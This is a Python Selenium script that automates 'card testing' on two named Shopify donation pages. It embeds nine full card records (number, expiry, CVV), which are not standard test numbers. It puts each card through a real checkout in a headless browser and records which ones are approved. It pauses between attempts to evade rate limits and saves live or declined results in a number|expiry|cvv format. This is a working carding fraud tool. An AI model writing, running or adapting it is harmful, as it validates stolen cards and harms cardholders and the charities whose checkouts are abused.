#!/usr/bin/env python3
"""
Card Testing Script for Shopify Sites
This script tests multiple credit cards on Shopify sites and records the results.
"""

import time
import json
import os
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException, NoSuchElementException

# Test cards
TEST_CARDS = [
    {"number": "4213630013499628", "expiry_month": "09", "expiry_year": "2028", "cvv": "988"},
    {"number": "5356810054178190", "expiry_month": "06", "expiry_year": "2027", "cvv": "572"},
    {"number": "4622391115565643", "expiry_month": "11", "expiry_year": "2027", "cvv": "108"},
    {"number": "5509890032421892", "expiry_month": "11", "expiry_year": "2027", "cvv": "017"},
    {"number": "5455122807222246", "expiry_month": "06", "expiry_year": "2028", "cvv": "999"},
    {"number": "4632252055500305", "expiry_month": "12", "expiry_year": "2028", "cvv": "730"},
    {"number": "5169201653090928", "expiry_month": "03", "expiry_year": "2029", "cvv": "562"},
    {"number": "4411037149484856", "expiry_month": "05", "expiry_year": "2029", "cvv": "259"},
    {"number": "379186167572585", "expiry_month": "06", "expiry_year": "2025", "cvv": "2778"}
]

# Test sites
TEST_SITES = [
    {
        "name": "Era of Peace",
        "url": "https://eraofpeace.org/products/donation-1?utm_source=shop_app&list_generator=link_to_storefront&context=product&user_id=251069197",
        "results": []
    },
    {
        "name": "Zion Park",
        "url": "https://store.zionpark.org/products/donation?utm_source=shop_app&list_generator=link_to_storefront&context=product&user_id=251069197",
        "results": []
    }
]

# Customer information
CUSTOMER_INFO = {
    "email": "test@example.com",
    "first_name": "Test",
    "last_name": "User",
    "address": "123 Test St",
    "city": "Test City",
    "state": "California",
    "zip": "90210",
    "phone": "5551234567"
}

def setup_driver():
    """Set up and return a Chrome WebDriver instance."""
    chrome_options = Options()
    chrome_options.add_argument("--headless")
    chrome_options.add_argument("--no-sandbox")
    chrome_options.add_argument("--disable-dev-shm-usage")
    
    driver = webdriver.Chrome(options=chrome_options)
    driver.set_window_size(1366, 768)
    return driver

def add_to_cart(driver, site):
    """Add the product to cart and proceed to checkout."""
    try:
        print(f"Visiting {site['name']}...")
        driver.get(site['url'])
        
        # Wait for the page to load
        WebDriverWait(driver, 10).until(
            EC.presence_of_element_located((By.CSS_SELECTOR, "button[name='add'], button.add-to-cart"))
        )
        
        # Click the Add to Cart button
        add_to_cart_button = driver.find_element(By.CSS_SELECTOR, "button[name='add'], button.add-to-cart")
        add_to_cart_button.click()
        
        # Wait for the cart to update
        time.sleep(3)
        
        # Find and click the checkout button
        try:
            checkout_button = WebDriverWait(driver, 10).until(
                EC.element_to_be_clickable((By.CSS_SELECTOR, "a.checkout-button, button.checkout, a[href*='checkout']"))
            )
            checkout_button.click()
        except TimeoutException:
            # Some sites might redirect automatically or have a different flow
            print("Checkout button not found, trying to navigate directly to checkout...")
            driver.get(f"{driver.current_url}/checkout")
        
        # Wait for checkout page to load
        WebDriverWait(driver, 15).until(
            EC.presence_of_element_located((By.CSS_SELECTOR, "input[name='checkout[email]'], input#email"))
        )
        
        print("Successfully reached checkout page")
        return True
    except Exception as e:
        print(f"Error adding to cart: {str(e)}")
        return False

def fill_customer_info(driver):
    """Fill in the customer information on the checkout page."""
    try:
        # Fill email
        email_field = WebDriverWait(driver, 10).until(
            EC.element_to_be_clickable((By.CSS_SELECTOR, "input[name='checkout[email]'], input#email"))
        )
        email_field.clear()
        email_field.send_keys(CUSTOMER_INFO["email"])
        
        # Check if we need to continue to shipping info
        try:
            continue_button = driver.find_element(By.CSS_SELECTOR, "button#continue_button, button[type='submit']")
            continue_button.click()
            time.sleep(2)
        except NoSuchElementException:
            print("No continue button found, assuming single-page checkout")
        
        # Fill shipping info
        try:
            # First name
            first_name = driver.find_element(By.CSS_SELECTOR, "input[name='checkout[shipping_address][first_name]'], input#TextField2")
            first_name.clear()
            first_name.send_keys(CUSTOMER_INFO["first_name"])
            
            # Last name
            last_name = driver.find_element(By.CSS_SELECTOR, "input[name='checkout[shipping_address][last_name]'], input#TextField3")
            last_name.clear()
            last_name.send_keys(CUSTOMER_INFO["last_name"])
            
            # Address
            address = driver.find_element(By.CSS_SELECTOR, "input[name='checkout[shipping_address][address1]'], input#TextField4")
            address.clear()
            address.send_keys(CUSTOMER_INFO["address"])
            
            # City
            city = driver.find_element(By.CSS_SELECTOR, "input[name='checkout[shipping_address][city]'], input#TextField5")
            city.clear()
            city.send_keys(CUSTOMER_INFO["city"])
            
            # Try to select state/province if dropdown exists
            try:
                state_select = driver.find_element(By.CSS_SELECTOR, "select[name='checkout[shipping_address][province]'], select#Select1")
                for option in state_select.find_elements(By.TAG_NAME, "option"):
                    if CUSTOMER_INFO["state"] in option.text:
                        option.click()
                        break
            except NoSuchElementException:
                print("State dropdown not found")
            
            # ZIP code
            zip_code = driver.find_element(By.CSS_SELECTOR, "input[name='checkout[shipping_address][zip]'], input#TextField6")
            zip_code.clear()
            zip_code.send_keys(CUSTOMER_INFO["zip"])
            
            # Phone
            phone = driver.find_element(By.CSS_SELECTOR, "input[name='checkout[shipping_address][phone]'], input#TextField7")
            phone.clear()
            phone.send_keys(CUSTOMER_INFO["phone"])
            
            # Continue to payment method
            continue_button = driver.find_element(By.CSS_SELECTOR, "button#continue_button, button[type='submit']")
            continue_button.click()
            time.sleep(3)
            
            # If there's a "continue to payment" button, click it
            try:
                payment_button = driver.find_element(By.CSS_SELECTOR, "button.step__footer__continue-btn, button[type='submit']")
                payment_button.click()
                time.sleep(3)
            except NoSuchElementException:
                print("No continue to payment button found")
            
        except Exception as e:
            print(f"Error filling shipping info: {str(e)}")
        
        print("Customer information filled successfully")
        return True
    except Exception as e:
        print(f"Error filling customer info: {str(e)}")
        return False

def test_card(driver, card, site_info):
    """Test a credit card and record the result."""
    try:
        # Switch to the iframe containing the card fields if it exists
        try:
            iframe = WebDriverWait(driver, 10).until(
                EC.presence_of_element_located((By.CSS_SELECTOR, "iframe.card-fields-iframe, iframe[id*='card-fields']"))
            )
            driver.switch_to.frame(iframe)
        except:
            print("No card iframe found, trying direct input")
        
        # Fill card number
        try:
            card_number = WebDriverWait(driver, 10).until(
                EC.element_to_be_clickable((By.CSS_SELECTOR, "input[name='number'], input#number"))
            )
            card_number.clear()
            card_number.send_keys(card["number"])
        except:
            print("Could not find card number field in iframe, trying parent document")
            driver.switch_to.default_content()
            card_number = driver.find_element(By.CSS_SELECTOR, "input[name='credit_card[number]'], input#card_number")
            card_number.clear()
            card_number.send_keys(card["number"])
        
        # Fill expiry date
        try:
            expiry = driver.find_element(By.CSS_SELECTOR, "input[name='expiry'], input#expiry")
            expiry.clear()
            expiry.send_keys(f"{card['expiry_month']}/{card['expiry_year'][2:]}")
        except:
            # Try separate month/year fields
            try:
                month = driver.find_element(By.CSS_SELECTOR, "input[name='expiry_month'], select[name='expiry_month']")
                month.clear()
                month.send_keys(card["expiry_month"])
                
                year = driver.find_element(By.CSS_SELECTOR, "input[name='expiry_year'], select[name='expiry_year']")
                year.clear()
                year.send_keys(card["expiry_year"])
            except:
                print("Could not find expiry fields")
        
        # Fill CVV
        try:
            cvv = driver.find_element(By.CSS_SELECTOR, "input[name='verification_value'], input#verification_value")
            cvv.clear()
            cvv.send_keys(card["cvv"])
        except:
            print("Could not find CVV field")
        
        # Switch back to main content if we were in an iframe
        driver.switch_to.default_content()
        
        # Fill name on card if it exists
        try:
            name_on_card = driver.find_element(By.CSS_SELECTOR, "input[name='name'], input#name")
            name_on_card.clear()
            name_on_card.send_keys(f"{CUSTOMER_INFO['first_name']} {CUSTOMER_INFO['last_name']}")
        except:
            print("No name on card field found")
        
        # Submit payment
        try:
            pay_button = WebDriverWait(driver, 10).until(
                EC.element_to_be_clickable((By.CSS_SELECTOR, "button#continue_button, button[type='submit'], button.step__footer__continue-btn"))
            )
            pay_button.click()
            
            # Wait for result
            time.sleep(5)
            
            # Check for success or error messages
            current_url = driver.current_url
            
            result = {
                "card": f"{card['number']}|{card['expiry_month']}|{card['expiry_year']}|{card['cvv']}",
                "url": current_url,
                "status": "Unknown"
            }
            
            if "thank_you" in current_url or "order-status" in current_url:
                result["status"] = "SUCCESS"
                result["message"] = "Payment successful"
            else:
                # Look for error messages
                try:
                    error_message = driver.find_element(By.CSS_SELECTOR, ".notice--error, .error-message, .alert-error, .message--error")
                    result["status"] = "DECLINED"
                    result["message"] = error_message.text.strip()
                except:
                    result["status"] = "UNKNOWN"
                    result["message"] = "Could not determine result"
            
            print(f"Card test result: {result['status']} - {result.get('message', 'No message')}")
            return result
            
        except Exception as e:
            print(f"Error submitting payment: {str(e)}")
            return {
                "card": f"{card['number']}|{card['expiry_month']}|{card['expiry_year']}|{card['cvv']}",
                "status": "ERROR",
                "message": f"Error submitting payment: {str(e)}",
                "url": driver.current_url
            }
            
    except Exception as e:
        print(f"Error testing card: {str(e)}")
        return {
            "card": f"{card['number']}|{card['expiry_month']}|{card['expiry_year']}|{card['cvv']}",
            "status": "ERROR",
            "message": f"Error testing card: {str(e)}",
            "url": driver.current_url
        }

def main():
    """Main function to run the tests."""
    results = {}
    
    for site in TEST_SITES:
        site_results = []
        print(f"\n=== Testing {site['name']} ===\n")
        
        for i, card in enumerate(TEST_CARDS):
            print(f"\nTesting card {i+1}/{len(TEST_CARDS)}: {card['number']}...")
            
            driver = setup_driver()
            try:
                if add_to_cart(driver, site):
                    if fill_customer_info(driver):
                        result = test_card(driver, card, site)
                        site_results.append(result)
                    else:
                        site_results.append({
                            "card": f"{card['number']}|{card['expiry_month']}|{card['expiry_year']}|{card['cvv']}",
                            "status": "ERROR",
                            "message": "Failed to fill customer information"
                        })
                else:
                    site_results.append({
                        "card": f"{card['number']}|{card['expiry_month']}|{card['expiry_year']}|{card['cvv']}",
                        "status": "ERROR",
                        "message": "Failed to add product to cart"
                    })
            except Exception as e:
                site_results.append({
                    "card": f"{card['number']}|{card['expiry_month']}|{card['expiry_year']}|{card['cvv']}",
                    "status": "ERROR",
                    "message": f"Unexpected error: {str(e)}"
                })
            finally:
                driver.quit()
                # Sleep between tests to avoid rate limiting
                print("Waiting 5 seconds before next test...")
                time.sleep(5)
        
        results[site['name']] = site_results
    
    # Save results to file
    with open('card_test_results.json', 'w') as f:
        json.dump(results, f, indent=2)
    
    print("\n=== Test Results Summary ===\n")
    for site_name, site_results in results.items():
        print(f"\n{site_name}:")
        for result in site_results:
            print(f"  Card: {result['card']}")
            print(f"  Status: {result['status']}")
            print(f"  Message: {result.get('message', 'No message')}")
            print(f"  URL: {result.get('url', 'N/A')}")
            print("")

if __name__ == "__main__":
    main()